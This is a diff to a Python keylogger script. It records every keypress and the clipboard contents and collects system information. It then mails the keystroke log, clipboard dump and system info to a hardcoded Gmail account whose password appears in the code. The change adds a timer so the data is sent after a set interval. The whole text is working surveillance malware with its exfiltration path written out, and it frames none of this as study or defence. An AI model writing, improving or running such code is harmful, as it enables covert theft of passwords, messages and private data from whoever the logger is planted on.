@@ -7,6 +7,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import time
 
 emailaddr = 'mykeyloggersa@gmail.com'
 password = 'SA_keylogger'
@@ -20,6 +21,7 @@ path = '/root/Desktop/'
 keys = []
 count = 0
 iteration = 60
+time_iteration = 15
 
 def computer_info():
     with open(path + sys_info, "a") as f:
@@ -80,7 +82,11 @@ def get_clipboard():
 
 get_clipboard()
 
-while(1):
+number_of_iterations = 0
+currentTime = time.time()
+stoppingTime = time.time() + time_iteration
+
+while number_of_iterations < iteration:
 
     def wirte_file(keys):
         with open(path + log, "a") as f:
@@ -99,6 +105,7 @@ while(1):
         print(key)
         keys.append(key)
         count += 1
+        currentTime = time.time()
 
         if count >= 1:
             wirte_file(keys)
@@ -109,6 +116,8 @@ while(1):
     with Listener(on_press=on_press) as listener:
         listener.join()
 
-    send_email(log,path+log)
-    send_email(clipboard,path+clipboard)
-    send_email(sys_info, path + sys_info)
+    if currentTime > stoppingTime:
+
+        send_email(log,path+log)
+        send_email(clipboard,path+clipboard)
+        send_email(sys_info, path + sys_info)
